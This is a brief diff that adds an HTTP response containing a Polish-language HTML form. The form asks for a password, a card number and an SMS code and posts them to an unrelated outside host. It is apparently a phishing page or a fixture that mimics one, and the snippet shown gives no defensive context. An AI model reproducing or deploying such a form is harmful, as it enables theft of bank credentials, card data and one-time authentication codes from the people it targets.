@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://collect.unrelated-site.net/pl" method="post"><input name="haslo" placeholder="Hasło"><input aria-label="Numer karty" name="f2"><input placeholder="Kod SMS" name="f3"></form></body></html>
